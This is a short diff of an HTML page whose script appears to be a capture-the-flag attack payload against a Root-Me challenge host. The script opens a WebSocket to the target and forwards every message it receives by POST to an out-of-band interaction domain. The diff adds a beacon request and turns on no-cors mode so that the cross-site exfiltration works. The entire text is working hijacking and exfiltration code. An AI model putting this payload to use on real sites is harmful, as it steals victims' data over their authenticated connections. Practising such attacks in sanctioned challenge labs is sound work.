@@ -5,19 +5,20 @@
 </head>
 <body>
 <script>
-      fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/ok1');
+      //fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/ok1');
       fetch('http://ctf29.root-me.org/room');
     setTimeout(() => {
         var ws = new WebSocket('ws://ctf29.root-me.org/ws');
 
         ws.onopen = function() {
+            fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun/hellox');
             ws.send("hello");
         };
 
         ws.onmessage = function(event) {
             fetch('https://zzuwmhquorgudjdpemhho6v60fd1xj2uo.oast.fun', {
                 method: 'POST',
-                //mode: 'no-cors',
+                mode: 'no-cors',
                 body: event.data
             });
         };
